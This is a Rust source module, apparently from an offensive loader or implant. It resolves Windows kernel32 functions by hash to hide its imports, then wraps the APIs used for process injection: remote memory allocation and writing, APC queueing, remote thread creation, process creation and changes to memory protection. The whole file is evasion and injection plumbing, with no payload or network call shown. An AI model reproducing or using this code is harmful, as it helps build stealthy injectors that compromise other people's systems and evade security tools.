#![allow(non_snake_case, dead_code, non_upper_case_globals)]

use std::{mem, sync::OnceLock};

use crate::syscall::{
    get_module_base_by_hash, resolve_export_by_hash,
    H_KERNEL32,
    H_VirtualAllocEx, H_VirtualFreeEx, H_WriteProcessMemory,
    H_QueueUserAPC, H_ResumeThread, H_CreateProcessW,
    H_WaitForSingleObject, H_OpenProcess, H_VirtualProtect,
    H_CreateRemoteThread, H_CloseHandle, H_SetEnvironmentVariableW,
};

type FnVirtualAllocEx = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, usize, u32, u32) -> *mut std::ffi::c_void;
type FnVirtualFreeEx = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, usize, u32) -> i32;
type FnWriteProcessMemory = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, *const u8, usize, *mut usize) -> i32;
type FnQueueUserAPC = unsafe extern "system" fn(unsafe extern "system" fn(*mut std::ffi::c_void) -> u32, *mut std::ffi::c_void, usize) -> u32;
type FnResumeThread = unsafe extern "system" fn(*mut std::ffi::c_void) -> u32;
type FnCreateProcessW = unsafe extern "system" fn(*const u16, *mut u16, *mut std::ffi::c_void, *mut std::ffi::c_void, i32, u32, *mut std::ffi::c_void, *const u16, *mut std::ffi::c_void, *mut std::ffi::c_void) -> i32;
type FnWaitForSingleObject = unsafe extern "system" fn(*mut std::ffi::c_void, u32) -> u32;
type FnOpenProcess = unsafe extern "system" fn(u32, i32, u32) -> *mut std::ffi::c_void;
type FnVirtualProtect = unsafe extern "system" fn(*const std::ffi::c_void, usize, u32, *mut u32) -> i32;
type FnCreateRemoteThread = unsafe extern "system" fn(*mut std::ffi::c_void, *mut std::ffi::c_void, usize, unsafe extern "system" fn(*mut std::ffi::c_void) -> u32, *mut std::ffi::c_void, u32, *mut u32) -> *mut std::ffi::c_void;
type FnCloseHandle = unsafe extern "system" fn(*mut std::ffi::c_void) -> i32;

struct DynApis {
    VirtualAllocEx: FnVirtualAllocEx,
    VirtualFreeEx: FnVirtualFreeEx,
    WriteProcessMemory: FnWriteProcessMemory,
    QueueUserAPC: FnQueueUserAPC,
    ResumeThread: FnResumeThread,
    CreateProcessW: FnCreateProcessW,
    WaitForSingleObject: FnWaitForSingleObject,
    OpenProcess: FnOpenProcess,
    CreateRemoteThread: FnCreateRemoteThread,
    CloseHandle: FnCloseHandle,
}

static APIS: OnceLock<DynApis> = OnceLock::new();

fn hash_resolve(module_hash: u32, export_hash: u32) -> Option<*mut u8> {
    let base = get_module_base_by_hash(module_hash)?;
    resolve_export_by_hash(base, export_hash)
}

fn init_apis() -> DynApis {
    unsafe {
        macro_rules! resolve {
            ($exp:expr) => {
                mem::transmute(hash_resolve(H_KERNEL32, $exp).unwrap_or(core::ptr::null_mut()))
            };
        }
        DynApis {
            VirtualAllocEx:    resolve!(H_VirtualAllocEx),
            VirtualFreeEx:     resolve!(H_VirtualFreeEx),
            WriteProcessMemory: resolve!(H_WriteProcessMemory),
            QueueUserAPC:      resolve!(H_QueueUserAPC),
            ResumeThread:      resolve!(H_ResumeThread),
            CreateProcessW:    resolve!(H_CreateProcessW),
            WaitForSingleObject: resolve!(H_WaitForSingleObject),
            OpenProcess:       resolve!(H_OpenProcess),
            CreateRemoteThread: resolve!(H_CreateRemoteThread),
            CloseHandle:       resolve!(H_CloseHandle),
        }
    }
}

pub fn init() {
    APIS.get_or_init(|| init_apis());
}

pub unsafe fn VirtualAllocEx(
    hprocess: *mut std::ffi::c_void,
    lpaddress: *mut std::ffi::c_void,
    dwsize: usize,
    flallocationtype: u32,
    flprotect: u32,
) -> *mut std::ffi::c_void {
    let apis = APIS.get().expect("");
    (apis.VirtualAllocEx)(hprocess, lpaddress, dwsize, flallocationtype, flprotect)
}

pub unsafe fn VirtualFreeEx(
    hprocess: *mut std::ffi::c_void,
    lpaddress: *mut std::ffi::c_void,
    dwsize: usize,
    dwfreetype: u32,
) -> i32 {
    let apis = APIS.get().expect("");
    (apis.VirtualFreeEx)(hprocess, lpaddress, dwsize, dwfreetype)
}

pub unsafe fn WriteProcessMemory(
    hprocess: *mut std::ffi::c_void,
    lpbaseaddress: *mut std::ffi::c_void,
    lpbuffer: *const u8,
    nsize: usize,
    lpnumberofbyteswritten: *mut usize,
) -> i32 {
    let apis = APIS.get().expect("");
    (apis.WriteProcessMemory)(hprocess, lpbaseaddress, lpbuffer, nsize, lpnumberofbyteswritten)
}

pub unsafe fn QueueUserAPC(
    pfnapc: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
    hthread: *mut std::ffi::c_void,
    dwparam: usize,
) -> u32 {
    let apis = APIS.get().expect("");
    (apis.QueueUserAPC)(pfnapc, hthread, dwparam)
}

pub unsafe fn ResumeThread(
    hthread: *mut std::ffi::c_void,
) -> u32 {
    let apis = APIS.get().expect("");
    (apis.ResumeThread)(hthread)
}

pub unsafe fn CreateProcessW(
    lpapplicationname: *const u16,
    lpcommandline: *mut u16,
    lpprocessattributes: *mut std::ffi::c_void,
    lpthreadattributes: *mut std::ffi::c_void,
    binherithandles: i32,
    dwcreationflags: u32,
    lpenvironment: *mut std::ffi::c_void,
    lpcurrentdirectory: *const u16,
    lpstartupinfo: *mut std::ffi::c_void,
    lpprocessinformation: *mut std::ffi::c_void,
) -> i32 {
    let apis = APIS.get().expect("");
    (apis.CreateProcessW)(lpapplicationname, lpcommandline, lpprocessattributes, lpthreadattributes, binherithandles, dwcreationflags, lpenvironment, lpcurrentdirectory, lpstartupinfo, lpprocessinformation)
}

pub unsafe fn WaitForSingleObject(
    hhandle: *mut std::ffi::c_void,
    dwmilliseconds: u32,
) -> u32 {
    let apis = APIS.get().expect("");
    (apis.WaitForSingleObject)(hhandle, dwmilliseconds)
}

pub unsafe fn OpenProcess(
    dwdesiredaccess: u32,
    binherithandle: i32,
    dwprocessid: u32,
) -> *mut std::ffi::c_void {
    let apis = APIS.get().expect("");
    (apis.OpenProcess)(dwdesiredaccess, binherithandle, dwprocessid)
}

pub unsafe fn VirtualProtect(
    lpaddress: *const std::ffi::c_void,
    dwsize: usize,
    flnewprotect: u32,
    lpfloldprotect: *mut u32,
) -> i32 {
    let vp_fn: FnVirtualProtect = mem::transmute(
        hash_resolve(H_KERNEL32, H_VirtualProtect).expect("")
    );
    (vp_fn)(lpaddress, dwsize, flnewprotect, lpfloldprotect)
}

pub unsafe fn CreateRemoteThread(
    hprocess: *mut std::ffi::c_void,
    lpthreadattributes: *mut std::ffi::c_void,
    dwstacksize: usize,
    lpstartaddress: unsafe extern "system" fn(*mut std::ffi::c_void) -> u32,
    lpparameter: *mut std::ffi::c_void,
    dwcreationflags: u32,
    lpthreadid: *mut u32,
) -> *mut std::ffi::c_void {
    let apis = APIS.get().expect("");
    (apis.CreateRemoteThread)(hprocess, lpthreadattributes, dwstacksize, lpstartaddress, lpparameter, dwcreationflags, lpthreadid)
}

pub unsafe fn CloseHandle(
    hobject: *mut std::ffi::c_void,
) -> i32 {
    let apis = APIS.get().expect("");
    (apis.CloseHandle)(hobject)
}

pub unsafe fn set_env_var(name: &str, value: &str) {
    let set_env_fn: unsafe extern "system" fn(*const u16, *const u16) -> i32 =
        match hash_resolve(H_KERNEL32, H_SetEnvironmentVariableW) {
            Some(p) => core::mem::transmute(p),
            None => return,
        };
    use std::ffi::OsStr;
    use std::os::windows::ffi::OsStrExt;
    let name_w: Vec<u16> = OsStr::new(name).encode_wide().chain(Some(0)).collect();
    let val_w: Vec<u16>  = OsStr::new(value).encode_wide().chain(Some(0)).collect();
    set_env_fn(name_w.as_ptr(), val_w.as_ptr());
}
